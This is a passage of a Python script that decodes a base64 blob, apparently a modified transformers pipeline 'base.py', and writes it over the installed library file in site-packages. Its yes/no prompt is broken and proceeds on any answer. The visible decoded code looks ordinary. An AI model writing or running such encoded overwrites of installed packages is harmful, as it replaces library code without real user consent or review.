ICAiIiIKICAgICAgICBQcmVwcm9jZXNzIHdpbGwgdGFrZSB0aGUgYGlucHV0X2Agb2YgYSBzcGVjaWZpYyBwaXBlbGluZSBhbmQgcmV0dXJuIGEgZGljdGlvbm5hcnkgb2YgZXZlcnl0aGluZyBuZWNlc3NhcnkgZm9yCiAgICAgICAgYF9mb3J3YXJkYCB0byBydW4gcHJvcGVybHkuIEl0IHNob3VsZCBjb250YWluIGF0IGxlYXN0IG9uZSB0ZW5zb3IsIGJ1dCBtaWdodCBoYXZlIGFyYml0cmFyeSBvdGhlciBpdGVtcy4KICAgICAgICAiIiIKICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yKCJwcmVwcm9jZXNzIG5vdCBpbXBsZW1lbnRlZCIpCgogICAgQGFic3RyYWN0bWV0aG9kCiAgICBkZWYgX2ZvcndhcmQoc2VsZiwgaW5wdXRfdGVuc29yczogRGljdFtzdHIsIEdlbmVyaWNUZW5zb3JdLCAqKmZvcndhcmRfcGFyYW1ldGVyczogRGljdCkgLT4gTW9kZWxPdXRwdXQ6CiAgICAgICAgIiIiCiAgICAgICAgX2ZvcndhcmQgd2lsbCByZWNlaXZlIHRoZSBwcmVwYXJlZCBkaWN0aW9ubmFyeSBmcm9tIGBwcmVwcm9jZXNzYCBhbmQgcnVuIGl0IG9uIHRoZSBtb2RlbC4gVGhpcyBtZXRob2QgbWlnaHQKICAgICAgICBpbnZvbHZlIHRoZSBHUFUgb3IgdGhlIENQVSBhbmQgc2hvdWxkIGJlIGFnbm9zdGljIHRvIGl0LiBJc29sYXRpbmcgdGhpcyBmdW5jdGlvbiBpcyB0aGUgcmVhc29uIGZvciBgcHJlcHJvY2Vzc2AKICAgICAgICBhbmQgYHBvc3Rwcm9jZXNzYCB0byBleGlzdCwgc28gdGhhdCB0aGUgaG90IHBhdGgsIHRoaXMgbWV0aG9kIGdlbmVyYWxseSBjYW4gcnVuIGFzIGZhc3QgYXMgcG9zc2libGUuCgogICAgICAgIEl0IGlzIG5vdCBtZWFudCB0byBiZSBjYWxsZWQgZGlyZWN0bHksIGBmb3J3YXJkYCBpcyBwcmVmZXJyZWQuIEl0IGlzIGJhc2ljYWxseSB0aGUgc2FtZSBidXQgY29udGFpbnMgYWRkaXRpb25hbAogICAgICAgIGNvZGUgc3Vycm91bmRpbmcgYF9mb3J3YXJkYCBtYWtpbmcgc3VyZSB0ZW5zb3JzIGFuZCBtb2RlbHMgYXJlIG9uIHRoZSBzYW1lIGRldmljZSwgZGlzYWJsaW5nIHRoZSB0cmFpbmluZyBwYXJ0CiAgICAgICAgb2YgdGhlIGNvZGUgKGxlYWRpbmcgdG8gZmFzdGVyIGluZmVyZW5jZSkuCiAgICAgICAgIiIiCiAgICAgICAgcmFpc2UgTm90SW1wbGVtZW50ZWRFcnJvcigiX2ZvcndhcmQgbm90IGltcGxlbWVudGVkIikKCiAgICBAYWJzdHJhY3RtZXRob2QKICAgIGRlZiBwb3N0cHJvY2VzcyhzZWxmLCBtb2RlbF9vdXRwdXRzOiBNb2RlbE91dHB1dCwgKipwb3N0cHJvY2Vzc19wYXJhbWV0ZXJzOiBEaWN0KSAtPiBBbnk6CiAgICAgICAgIiIiCiAgICAgICAgUG9zdHByb2Nlc3Mgd2lsbCByZWNlaXZlIHRoZSByYXcgb3V0cHV0cyBvZiB0aGUgYF9mb3J3YXJkYCBtZXRob2QsIGdlbmVyYWxseSB0ZW5zb3JzLCBhbmQgcmVmb3JtYXQgdGhlbSBpbnRvCiAgICAgICAgc29tZXRoaW5nIG1vcmUgZnJpZW5kbHkuIEdlbmVyYWxseSBpdCB3aWxsIG91dHB1dCBhIGxpc3Qgb3IgYSBkaWN0IG9yIHJlc3VsdHMgKGNvbnRhaW5pbmcganVzdCBzdHJpbmdzIGFuZAogICAgICAgIG51bWJlcnMpLgogICAgICAgICIiIgogICAgICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3IoInBvc3Rwcm9jZXNzIG5vdCBpbXBsZW1lbnRlZCIpCgogICAgZGVmIGdldF9pbmZlcmVuY2VfY29udGV4dChzZWxmKToKICAgICAgICBpbmZlcmVuY2VfY29udGV4dCA9ICgKICAgICAgICAgICAgdG9yY2guaW5mZXJlbmNlX21vZGUKICAgICAgICAgICAgaWYgdmVyc2lvbi5wYXJzZSh2ZXJzaW9uLnBhcnNlKHRvcmNoLl9fdmVyc2lvbl9fKS5iYXNlX3ZlcnNpb24pID49IHZlcnNpb24ucGFyc2UoIjEuOS4wIikKICAgICAgICAgICAgZWxzZSB0b3JjaC5ub19ncmFkCiAgICAgICAgKQogICAgICAgIHJldHVybiBpbmZlcmVuY2VfY29udGV4dAoKICAgIGRlZiBmb3J3YXJkKHNlbGYsIG1vZGVsX2lucHV0cywgKipmb3J3YXJkX3BhcmFtcyk6CiAgICAgICAgd2l0aCBzZWxmLmRldmljZV9wbGFjZW1lbnQoKToKICAgICAgICAgICAgaWYgc2VsZi5mcmFtZXdvcmsgPT0gInRmIjoKICAgICAgICAgICAgICAgIG1vZGVsX2lucHV0c1sidHJhaW5pbmciXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBtb2RlbF9vdXRwdXRzID0gc2VsZi5fZm9yd2FyZChtb2RlbF9pbnB1dHMsICoqZm9yd2FyZF9wYXJhbXMpCiAgICAgICAgICAgIGVsaWYgc2VsZi5mcmFtZXdvcmsgPT0gInB0IjoKICAgICAgICAgICAgICAgIGluZmVyZW5jZV9jb250ZXh0ID0gc2VsZi5nZXRfaW5mZXJlbmNlX2NvbnRleHQoKQogICAgICAgICAgICAgICAgd2l0aCBpbmZlcmVuY2VfY29udGV4dCgpOgogICAgICAgICAgICAgICAgICAgIG1vZGVsX2lucHV0cyA9IHNlbGYuX2Vuc3VyZV90ZW5zb3Jfb25fZGV2aWNlKG1vZGVsX2lucHV0cywgZGV2aWNlPXNlbGYuZGV2aWNlKQogICAgICAgICAgICAgICAgICAgIG1vZGVsX291dHB1dHMgPSBzZWxmLl9mb3J3YXJkKG1vZGVsX2lucHV0cywgKipmb3J3YXJkX3BhcmFtcykKICAgICAgICAgICAgICAgICAgICBtb2RlbF9vdXRwdXRzID0gc2VsZi5fZW5zdXJlX3RlbnNvcl9vbl9kZXZpY2UobW9kZWxfb3V0cHV0cywgZGV2aWNlPXRvcmNoLmRldmljZSgiY3B1IikpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKGYiRnJhbWV3b3JrIHtzZWxmLmZyYW1ld29ya30gaXMgbm90IHN1cHBvcnRlZCIpCiAgICAgICAgcmV0dXJuIG1vZGVsX291dHB1dHMKCiAgICBkZWYgZ2V0X2l0ZXJhdG9yKAogICAgICAgIHNlbGYsIGlucHV0cywgbnVtX3dvcmtlcnM6IGludCwgYmF0Y2hfc2l6ZTogaW50LCBwcmVwcm9jZXNzX3BhcmFtcywgZm9yd2FyZF9wYXJhbXMsIHBvc3Rwcm9jZXNzX3BhcmFtcwogICAgKToKICAgICAgICBpZiBpc2luc3RhbmNlKGlucHV0cywgY29sbGVjdGlvbnMuYWJjLlNpemVkKToKICAgICAgICAgICAgZGF0YXNldCA9IFBpcGVsaW5lRGF0YXNldChpbnB1dHMsIHNlbGYucHJlcHJvY2VzcywgcHJlcHJvY2Vzc19wYXJhbXMpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgaWYgbnVtX3dvcmtlcnMgPiAxOgogICAgICAgICAgICAgICAgbG9nZ2VyLndhcm5pbmcoCiAgICAgICAgICAgICAgICAgICAgIkZvciBpdGVyYWJsZSBkYXRhc2V0IHVzaW5nIG51bV93b3JrZXJzPjEgaXMgbGlrZWx5IHRvIHJlc3VsdCIKICAgICAgICAgICAgICAgICAgICAiIGluIGVycm9ycyBzaW5jZSBldmVyeXRoaW5nIGlzIGl0ZXJhYmxlLCBzZXR0aW5nIGBudW1fd29ya2Vycz0xYCIKICAgICAgICAgICAgICAgICAgICAiIHRvIGd1YXJhbnRlZSBjb3JyZWN0bmVzcy4iCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICBudW1fd29ya2VycyA9IDEKICAgICAgICAgICAgZGF0YXNldCA9IFBpcGVsaW5lSXRlcmF0b3IoaW5wdXRzLCBzZWxmLnByZXByb2Nlc3MsIHByZXByb2Nlc3NfcGFyYW1zKQogICAgICAgIGlmICJUT0tFTklaRVJTX1BBUkFMTEVMSVNNIiBub3QgaW4gb3MuZW52aXJvbjoKICAgICAgICAgICAgbG9nZ2VyLmluZm8oIkRpc2FibGluZyB0b2tlbml6ZXIgcGFyYWxsZWxpc20sIHdlJ3JlIHVzaW5nIERhdGFMb2FkZXIgbXVsdGl0aHJlYWRpbmcgYWxyZWFkeSIpCiAgICAgICAgICAgIG9zLmVudmlyb25bIlRPS0VOSVpFUlNfUEFSQUxMRUxJU00iXSA9ICJmYWxzZSIKICAgICAgICBjb2xsYXRlX2ZuID0gbm9fY29sbGF0ZV9mbiBpZiBiYXRjaF9zaXplID09IDEgZWxzZSBwYWRfY29sbGF0ZV9mbihzZWxmLnRva2VuaXplciwgc2VsZi5mZWF0dXJlX2V4dHJhY3RvcikKICAgICAgICBkYXRhbG9hZGVyID0gRGF0YUxvYWRlcihkYXRhc2V0LCBudW1fd29ya2Vycz1udW1fd29ya2VycywgYmF0Y2hfc2l6ZT1iYXRjaF9zaXplLCBjb2xsYXRlX2ZuPWNvbGxhdGVfZm4pCiAgICAgICAgbW9kZWxfaXRlcmF0b3IgPSBQaXBlbGluZUl0ZXJhdG9yKGRhdGFsb2FkZXIsIHNlbGYuZm9yd2FyZCwgZm9yd2FyZF9wYXJhbXMsIGxvYWRlcl9iYXRjaF9zaXplPWJhdGNoX3NpemUpCiAgICAgICAgZmluYWxfaXRlcmF0b3IgPSBQaXBlbGluZUl0ZXJhdG9yKG1vZGVsX2l0ZXJhdG9yLCBzZWxmLnBvc3Rwcm9jZXNzLCBwb3N0cHJvY2Vzc19wYXJhbXMpCiAgICAgICAgcmV0dXJuIGZpbmFsX2l0ZXJhdG9yCgogICAgZGVmIF9fY2FsbF9fKHNlbGYsIGlucHV0cywgKmFyZ3MsIG51bV93b3JrZXJzPU5vbmUsIGJhdGNoX3NpemU9Tm9uZSwgKiprd2FyZ3MpOgogICAgICAgIGlmIGFyZ3M6CiAgICAgICAgICAgIGxvZ2dlci53YXJuaW5nKGYiSWdub3JpbmcgYXJncyA6IHthcmdzfSIpCgogICAgICAgIGlmIG51bV93b3JrZXJzIGlzIE5vbmU6CiAgICAgICAgICAgIGlmIHNlbGYuX251bV93b3JrZXJzIGlzIE5vbmU6CiAgICAgICAgICAgICAgICBudW1fd29ya2VycyA9IDAKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIG51bV93b3JrZXJzID0gc2VsZi5fbnVtX3dvcmtlcnMKICAgICAgICBpZiBiYXRjaF9zaXplIGlzIE5vbmU6CiAgICAgICAgICAgIGlmIHNlbGYuX2JhdGNoX3NpemUgaXMgTm9uZToKICAgICAgICAgICAgICAgIGJhdGNoX3NpemUgPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBiYXRjaF9zaXplID0gc2VsZi5fYmF0Y2hfc2l6ZQoKICAgICAgICBwcmVwcm9jZXNzX3BhcmFtcywgZm9yd2FyZF9wYXJhbXMsIHBvc3Rwcm9jZXNzX3BhcmFtcyA9IHNlbGYuX3Nhbml0aXplX3BhcmFtZXRlcnMoKiprd2FyZ3MpCgogICAgICAgICMgRnVzZSBfX2luaXRfXyBwYXJhbXMgYW5kIF9fY2FsbF9fIHBhcmFtcyB3aXRob3V0IG1vZGlmeWluZyB0aGUgX19pbml0X18gb25lcy4KICAgICAgICBwcmVwcm9jZXNzX3BhcmFtcyA9IHsqKnNlbGYuX3ByZXByb2Nlc3NfcGFyYW1zLCAqKnByZXByb2Nlc3NfcGFyYW1zfQogICAgICAgIGZvcndhcmRfcGFyYW1zID0geyoqc2VsZi5fZm9yd2FyZF9wYXJhbXMsICoqZm9yd2FyZF9wYXJhbXN9CiAgICAgICAgcG9zdHByb2Nlc3NfcGFyYW1zID0geyoqc2VsZi5fcG9zdHByb2Nlc3NfcGFyYW1zLCAqKnBvc3Rwcm9jZXNzX3BhcmFtc30KCiAgICAgICAgc2VsZi5jYWxsX2NvdW50ICs9IDEKICAgICAgICBpZiBzZWxmLmNhbGxfY291bnQgPiAxMCBhbmQgc2VsZi5mcmFtZXdvcmsgPT0gInB0IiBhbmQgc2VsZi5kZXZpY2UudHlwZSA9PSAiY3VkYSI6CiAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oCiAgICAgICAgICAgICAgICAiWW91IHNlZW0gdG8gYmUgdXNpbmcgdGhlIHBpcGVsaW5lcyBzZXF1ZW50aWFsbHkgb24gR1BVLiBJbiBvcmRlciB0byBtYXhpbWl6ZSBlZmZpY2llbmN5IHBsZWFzZSB1c2UgYSIKICAgICAgICAgICAgICAgICIgZGF0YXNldCIsCiAgICAgICAgICAgICAgICBVc2VyV2FybmluZywKICAgICAgICAgICAgKQoKICAgICAgICBpc19kYXRhc2V0ID0gRGF0YXNldCBpcyBub3QgTm9uZSBhbmQgaXNpbnN0YW5jZShpbnB1dHMsIERhdGFzZXQpCiAgICAgICAgaXNfZ2VuZXJhdG9yID0gaXNpbnN0YW5jZShpbnB1dHMsIHR5cGVzLkdlbmVyYXRvclR5cGUpCiAgICAgICAgaXNfbGlzdCA9IGlzaW5zdGFuY2UoaW5wdXRzLCBsaXN0KQoKICAgICAgICBpc19pdGVyYWJsZSA9IGlzX2RhdGFzZXQgb3IgaXNfZ2VuZXJhdG9yIG9yIGlzX2xpc3QKCiAgICAgICAgIyBUT0RPIG1ha2UgdGhlIGdldF9pdGVyYXRvciB3b3JrIGFsc28gZm9yIGB0ZmAgKGFuZCBgZmxheGApLgogICAgICAgIGNhbl91c2VfaXRlcmF0b3IgPSBzZWxmLmZyYW1ld29yayA9PSAicHQiIGFuZCAoaXNfZGF0YXNldCBvciBpc19nZW5lcmF0b3Igb3IgaXNfbGlzdCkKCiAgICAgICAgaWYgaXNfbGlzdDoKICAgICAgICAgICAgaWYgY2FuX3VzZV9pdGVyYXRvcjoKICAgICAgICAgICAgICAgIGZpbmFsX2l0ZXJhdG9yID0gc2VsZi5nZXRfaXRlcmF0b3IoCiAgICAgICAgICAgICAgICAgICAgaW5wdXRzLCBudW1fd29ya2VycywgYmF0Y2hfc2l6ZSwgcHJlcHJvY2Vzc19wYXJhbXMsIGZvcndhcmRfcGFyYW1zLCBwb3N0cHJvY2Vzc19wYXJhbXMKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIG91dHB1dHMgPSBbb3V0cHV0IGZvciBvdXRwdXQgaW4gZmluYWxfaXRlcmF0b3JdCiAgICAgICAgICAgICAgICByZXR1cm4gb3V0cHV0cwogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0dXJuIHNlbGYucnVuX211bHRpKGlucHV0cywgcHJlcHJvY2Vzc19wYXJhbXMsIGZvcndhcmRfcGFyYW1zLCBwb3N0cHJvY2Vzc19wYXJhbXMpCiAgICAgICAgZWxpZiBjYW5fdXNlX2l0ZXJhdG9yOgogICAgICAgICAgICByZXR1cm4gc2VsZi5nZXRfaXRlcmF0b3IoCiAgICAgICAgICAgICAgICBpbnB1dHMsIG51bV93b3JrZXJzLCBiYXRjaF9zaXplLCBwcmVwcm9jZXNzX3BhcmFtcywgZm9yd2FyZF9wYXJhbXMsIHBvc3Rwcm9jZXNzX3BhcmFtcwogICAgICAgICAgICApCiAgICAgICAgZWxpZiBpc19pdGVyYWJsZToKICAgICAgICAgICAgcmV0dXJuIHNlbGYuaXRlcmF0ZShpbnB1dHMsIHByZXByb2Nlc3NfcGFyYW1zLCBmb3J3YXJkX3BhcmFtcywgcG9zdHByb2Nlc3NfcGFyYW1zKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiBzZWxmLnJ1bl9zaW5nbGUoaW5wdXRzLCBwcmVwcm9jZXNzX3BhcmFtcywgZm9yd2FyZF9wYXJhbXMsIHBvc3Rwcm9jZXNzX3BhcmFtcykKCiAgICBkZWYgcnVuX211bHRpKHNlbGYsIGlucHV0cywgcHJlcHJvY2Vzc19wYXJhbXMsIGZvcndhcmRfcGFyYW1zLCBwb3N0cHJvY2Vzc19wYXJhbXMpOgogICAgICAgIHJldHVybiBbc2VsZi5ydW5fc2luZ2xlKGl0ZW0sIHByZXByb2Nlc3NfcGFyYW1zLCBmb3J3YXJkX3BhcmFtcywgcG9zdHByb2Nlc3NfcGFyYW1zKSBmb3IgaXRlbSBpbiBpbnB1dHNdCgogICAgZGVmIHJ1bl9zaW5nbGUoc2VsZiwgaW5wdXRzLCBwcmVwcm9jZXNzX3BhcmFtcywgZm9yd2FyZF9wYXJhbXMsIHBvc3Rwcm9jZXNzX3BhcmFtcyk6CiAgICAgICAgbW9kZWxfaW5wdXRzID0gc2VsZi5wcmVwcm9jZXNzKGlucHV0cywgKipwcmVwcm9jZXNzX3BhcmFtcykKICAgICAgICBtb2RlbF9vdXRwdXRzID0gc2VsZi5mb3J3YXJkKG1vZGVsX2lucHV0cywgKipmb3J3YXJkX3BhcmFtcykKICAgICAgICBvdXRwdXRzID0gc2VsZi5wb3N0cHJvY2Vzcyhtb2RlbF9vdXRwdXRzLCAqKnBvc3Rwcm9jZXNzX3BhcmFtcykKICAgICAgICByZXR1cm4gb3V0cHV0cwoKICAgIGRlZiBpdGVyYXRlKHNlbGYsIGlucHV0cywgcHJlcHJvY2Vzc19wYXJhbXMsIGZvcndhcmRfcGFyYW1zLCBwb3N0cHJvY2Vzc19wYXJhbXMpOgogICAgICAgICMgVGhpcyBmdW5jdGlvbiBzaG91bGQgYmVjb21lIGBnZXRfaXRlcmF0b3JgIGFnYWluLCB0aGlzIGlzIGEgdGVtcG9yYXJ5CiAgICAgICAgIyBlYXN5IHNvbHV0aW9uLgogICAgICAgIGZvciBpbnB1dF8gaW4gaW5wdXRzOgogICAgICAgICAgICB5aWVsZCBzZWxmLnJ1bl9zaW5nbGUoaW5wdXRfLCBwcmVwcm9jZXNzX3BhcmFtcywgZm9yd2FyZF9wYXJhbXMsIHBvc3Rwcm9jZXNzX3BhcmFtcykKCgpjbGFzcyBDaHVua1BpcGVsaW5lKFBpcGVsaW5lKToKICAgIGRlZiBydW5fc2luZ2xlKHNlbGYsIGlucHV0cywgcHJlcHJvY2Vzc19wYXJhbXMsIGZvcndhcmRfcGFyYW1zLCBwb3N0cHJvY2Vzc19wYXJhbXMpOgogICAgICAgIGFsbF9vdXRwdXRzID0gW10KICAgICAgICBmb3IgbW9kZWxfaW5wdXRzIGluIHNlbGYucHJlcHJvY2VzcyhpbnB1dHMsICoqcHJlcHJvY2Vzc19wYXJhbXMpOgogICAgICAgICAgICBtb2RlbF9vdXRwdXRzID0gc2VsZi5mb3J3YXJkKG1vZGVsX2lucHV0cywgKipmb3J3YXJkX3BhcmFtcykKICAgICAgICAgICAgYWxsX291dHB1dHMuYXBwZW5kKG1vZGVsX291dHB1dHMpCiAgICAgICAgb3V0cHV0cyA9IHNlbGYucG9zdHByb2Nlc3MoYWxsX291dHB1dHMsICoqcG9zdHByb2Nlc3NfcGFyYW1zKQogICAgICAgIHJldHVybiBvdXRwdXRzCgogICAgZGVmIGdldF9pdGVyYXRvcigKICAgICAgICBzZWxmLCBpbnB1dHMsIG51bV93b3JrZXJzOiBpbnQsIGJhdGNoX3NpemU6IGludCwgcHJlcHJvY2Vzc19wYXJhbXMsIGZvcndhcmRfcGFyYW1zLCBwb3N0cHJvY2Vzc19wYXJhbXMKICAgICk6CiAgICAgICAgaWYgIlRPS0VOSVpFUlNfUEFSQUxMRUxJU00iIG5vdCBpbiBvcy5lbnZpcm9uOgogICAgICAgICAgICBsb2dnZXIuaW5mbygiRGlzYWJsaW5nIHRva2VuaXplciBwYXJhbGxlbGlzbSwgd2UncmUgdXNpbmcgRGF0YUxvYWRlciBtdWx0aXRocmVhZGluZyBhbHJlYWR5IikKICAgICAgICAgICAgb3MuZW52aXJvblsiVE9LRU5JWkVSU19QQVJBTExFTElTTSJdID0gImZhbHNlIgogICAgICAgIGlmIG51bV93b3JrZXJzID4gMToKICAgICAgICAgICAgbG9nZ2VyLndhcm5pbmcoCiAgICAgICAgICAgICAgICAiRm9yIENodW5rUGlwZWxpbmUgdXNpbmcgbnVtX3dvcmtlcnM+MCBpcyBsaWtlbHkgdG8gcmVzdWx0IGluIGVycm9ycyBzaW5jZSBldmVyeXRoaW5nIGlzIGl0ZXJhYmxlLCIKICAgICAgICAgICAgICAgICIgc2V0dGluZyBgbnVtX3dvcmtlcnM9MWAgdG8gZ3VhcmFudGVlIGNvcnJlY3RuZXNzLiIKICAgICAgICAgICAgKQogICAgICAgICAgICBudW1fd29ya2VycyA9IDEKICAgICAgICBkYXRhc2V0ID0gUGlwZWxpbmVDaHVua0l0ZXJhdG9yKGlucHV0cywgc2VsZi5wcmVwcm9jZXNzLCBwcmVwcm9jZXNzX3BhcmFtcykKICAgICAgICBjb2xsYXRlX2ZuID0gbm9fY29sbGF0ZV9mbiBpZiBiYXRjaF9zaXplID09IDEgZWxzZSBwYWRfY29sbGF0ZV9mbihzZWxmLnRva2VuaXplciwgc2VsZi5mZWF0dXJlX2V4dHJhY3RvcikKICAgICAgICBkYXRhbG9hZGVyID0gRGF0YUxvYWRlcihkYXRhc2V0LCBudW1fd29ya2Vycz1udW1fd29ya2VycywgYmF0Y2hfc2l6ZT1iYXRjaF9zaXplLCBjb2xsYXRlX2ZuPWNvbGxhdGVfZm4pCiAgICAgICAgbW9kZWxfaXRlcmF0b3IgPSBQaXBlbGluZVBhY2tJdGVyYXRvcihkYXRhbG9hZGVyLCBzZWxmLmZvcndhcmQsIGZvcndhcmRfcGFyYW1zLCBsb2FkZXJfYmF0Y2hfc2l6ZT1iYXRjaF9zaXplKQogICAgICAgIGZpbmFsX2l0ZXJhdG9yID0gUGlwZWxpbmVJdGVyYXRvcihtb2RlbF9pdGVyYXRvciwgc2VsZi5wb3N0cHJvY2VzcywgcG9zdHByb2Nlc3NfcGFyYW1zKQogICAgICAgIHJldHVybiBmaW5hbF9pdGVyYXRvcgoKCmNsYXNzIFBpcGVsaW5lUmVnaXN0cnk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgc3VwcG9ydGVkX3Rhc2tzOiBEaWN0W3N0ciwgQW55XSwgdGFza19hbGlhc2VzOiBEaWN0W3N0ciwgc3RyXSkgLT4gTm9uZToKICAgICAgICBzZWxmLnN1cHBvcnRlZF90YXNrcyA9IHN1cHBvcnRlZF90YXNrcwogICAgICAgIHNlbGYudGFza19hbGlhc2VzID0gdGFza19hbGlhc2VzCgogICAgZGVmIGdldF9zdXBwb3J0ZWRfdGFza3Moc2VsZikgLT4gTGlzdFtzdHJdOgogICAgICAgIHN1cHBvcnRlZF90YXNrID0gbGlzdChzZWxmLnN1cHBvcnRlZF90YXNrcy5rZXlzKCkpICsgbGlzdChzZWxmLnRhc2tfYWxpYXNlcy5rZXlzKCkpCiAgICAgICAgc3VwcG9ydGVkX3Rhc2suc29ydCgpCiAgICAgICAgcmV0dXJuIHN1cHBvcnRlZF90YXNrCgogICAgZGVmIGNoZWNrX3Rhc2soc2VsZiwgdGFzazogc3RyKSAtPiBUdXBsZVtzdHIsIERpY3QsIEFueV06CiAgICAgICAgaWYgdGFzayBpbiBzZWxmLnRhc2tfYWxpYXNlczoKICAgICAgICAgICAgdGFzayA9IHNlbGYudGFza19hbGlhc2VzW3Rhc2tdCiAgICAgICAgaWYgdGFzayBpbiBzZWxmLnN1cHBvcnRlZF90YXNrczoKICAgICAgICAgICAgdGFyZ2V0ZWRfdGFzayA9IHNlbGYuc3VwcG9ydGVkX3Rhc2tzW3Rhc2tdCiAgICAgICAgICAgIHJldHVybiB0YXNrLCB0YXJnZXRlZF90YXNrLCBOb25lCgogICAgICAgIGlmIHRhc2suc3RhcnRzd2l0aCgidHJhbnNsYXRpb24iKToKICAgICAgICAgICAgdG9rZW5zID0gdGFzay5zcGxpdCgiXyIpCiAgICAgICAgICAgIGlmIGxlbih0b2tlbnMpID09IDQgYW5kIHRva2Vuc1swXSA9PSAidHJhbnNsYXRpb24iIGFuZCB0b2tlbnNbMl0gPT0gInRvIjoKICAgICAgICAgICAgICAgIHRhcmdldGVkX3Rhc2sgPSBzZWxmLnN1cHBvcnRlZF90YXNrc1sidHJhbnNsYXRpb24iXQogICAgICAgICAgICAgICAgdGFzayA9ICJ0cmFuc2xhdGlvbiIKICAgICAgICAgICAgICAgIHJldHVybiB0YXNrLCB0YXJnZXRlZF90YXNrLCAodG9rZW5zWzFdLCB0b2tlbnNbM10pCiAgICAgICAgICAgIHJhaXNlIEtleUVycm9yKGYiSW52YWxpZCB0cmFuc2xhdGlvbiB0YXNrIHt0YXNrfSwgdXNlICd0cmFuc2xhdGlvbl9YWF90b19ZWScgZm9ybWF0IikKCiAgICAgICAgcmFpc2UgS2V5RXJyb3IoCiAgICAgICAgICAgIGYiVW5rbm93biB0YXNrIHt0YXNrfSwgYXZhaWxhYmxlIHRhc2tzIGFyZSB7c2VsZi5nZXRfc3VwcG9ydGVkX3Rhc2tzKCkgKyBbJ3RyYW5zbGF0aW9uX1hYX3RvX1lZJ119IgogICAgICAgICkKCiAgICBkZWYgcmVnaXN0ZXJfcGlwZWxpbmUoCiAgICAgICAgc2VsZiwKICAgICAgICB0YXNrOiBzdHIsCiAgICAgICAgcGlwZWxpbmVfY2xhc3M6IHR5cGUsCiAgICAgICAgcHRfbW9kZWw6IE9wdGlvbmFsW1VuaW9uW3R5cGUsIFR1cGxlW3R5cGVdXV0gPSBOb25lLAogICAgICAgIHRmX21vZGVsOiBPcHRpb25hbFtVbmlvblt0eXBlLCBUdXBsZVt0eXBlXV1dID0gTm9uZSwKICAgICAgICBkZWZhdWx0OiBPcHRpb25hbFtEaWN0XSA9IE5vbmUsCiAgICAgICAgdHlwZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUsCiAgICApIC0+IE5vbmU6CiAgICAgICAgaWYgdGFzayBpbiBzZWxmLnN1cHBvcnRlZF90YXNrczoKICAgICAgICAgICAgbG9nZ2VyLndhcm5pbmcoZiJ7dGFza30gaXMgYWxyZWFkeSByZWdpc3RlcmVkLiBPdmVyd3JpdGluZyBwaXBlbGluZSBmb3IgdGFzayB7dGFza30uLi4iKQoKICAgICAgICBpZiBwdF9tb2RlbCBpcyBOb25lOgogICAgICAgICAgICBwdF9tb2RlbCA9ICgpCiAgICAgICAgZWxpZiBub3QgaXNpbnN0YW5jZShwdF9tb2RlbCwgdHVwbGUpOgogICAgICAgICAgICBwdF9tb2RlbCA9IChwdF9tb2RlbCwpCgogICAgICAgIGlmIHRmX21vZGVsIGlzIE5vbmU6CiAgICAgICAgICAgIHRmX21vZGVsID0gKCkKICAgICAgICBlbGlmIG5vdCBpc2luc3RhbmNlKHRmX21vZGVsLCB0dXBsZSk6CiAgICAgICAgICAgIHRmX21vZGVsID0gKHRmX21vZGVsLCkKCiAgICAgICAgdGFza19pbXBsID0geyJpbXBsIjogcGlwZWxpbmVfY2xhc3MsICJwdCI6IHB0X21vZGVsLCAidGYiOiB0Zl9tb2RlbH0KCiAgICAgICAgaWYgZGVmYXVsdCBpcyBub3QgTm9uZToKICAgICAgICAgICAgaWYgIm1vZGVsIiBub3QgaW4gZGVmYXVsdCBhbmQgKCJwdCIgaW4gZGVmYXVsdCBvciAidGYiIGluIGRlZmF1bHQpOgogICAgICAgICAgICAgICAgZGVmYXVsdCA9IHsibW9kZWwiOiBkZWZhdWx0fQogICAgICAgICAgICB0YXNrX2ltcGxbImRlZmF1bHQiXSA9IGRlZmF1bHQKCiAgICAgICAgaWYgdHlwZSBpcyBub3QgTm9uZToKICAgICAgICAgICAgdGFza19pbXBsWyJ0eXBlIl0gPSB0eXBlCgogICAgICAgIHNlbGYuc3VwcG9ydGVkX3Rhc2tzW3Rhc2tdID0gdGFza19pbXBsCiAgICAgICAgcGlwZWxpbmVfY2xhc3MuX3JlZ2lzdGVyZWRfaW1wbCA9IHt0YXNrOiB0YXNrX2ltcGx9CgogICAgZGVmIHRvX2RpY3Qoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuc3VwcG9ydGVkX3Rhc2tz'

def mod_t(py_dir):
    dirr = py_dir+site_p_dir+'/base.py'
    print(' Modding:', dirr)
    with open(dirr, 'w+') as f:
        f.write(base64.b64decode(code).decode())
    print(' Mode complete!')

if __name__ == '__main__':
    py_dir = sys.path[4]
    print()
    print(' Would you like to install the mod into (', py_dir, ') ?')
    mod_ = input(' (Y/n) : ')
    if mod_.lower() != 'n' or mod_.lower() != 'no':
        mod_t(py_dir)
    else:
        quit()
